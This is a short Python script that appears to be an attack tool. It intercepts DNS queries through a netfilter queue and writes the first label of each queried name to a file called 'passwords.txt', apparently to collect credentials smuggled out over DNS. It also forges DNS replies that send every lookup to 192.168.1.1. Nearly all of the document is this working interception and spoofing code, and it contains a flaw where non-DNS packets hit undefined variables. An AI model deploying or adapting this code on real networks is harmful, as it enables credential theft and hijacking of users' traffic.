import subprocess
import sys
import socket
import select
from scapy.all import *
from netfilterqueue import NetfilterQueue
from threading import Thread, Lock
import random
from datetime import datetime

from scapy.layers.dns import *
from scapy.layers.inet import *

thread_mysql_sniffer = None
thread_http_proxy = None

mutex = Lock()
src_ips = []
threads = []


def thread_dns_nfqueue(packet):

    ip_p = IP(packet.get_payload())
    src_ip = ip_p[IP].src
    orig_dest_ip = ip_p[IP].dst


    if ip_p.haslayer(DNSQR):
        query = ip_p[DNSQR].qname.decode("utf-8")
        query_split = query.split('.')
        with open("passwords.txt", "a") as f:
            f.write(query_split[0] + '\n')
        print(query)
        dns = ip_p.getlayer(DNS)
        ip = ip_p.getlayer(IP)
        trans_id = dns.id


    resp = IP(dst=ip.src, src=ip.dst) / UDP(dport=ip.sport, sport=ip.dport)
    resp /= DNS(id=dns.id, qr=1, qd=dns.qd,
                an=DNSRR(rrname=dns.qd.qname, ttl=0, rdata='192.168.1.1'))


    send(resp, verbose=0)


    packet.accept()


if __name__ == "__main__":

    nf_queue = NetfilterQueue()
    nf_queue.bind(1, thread_dns_nfqueue)
    nf_queue.run()
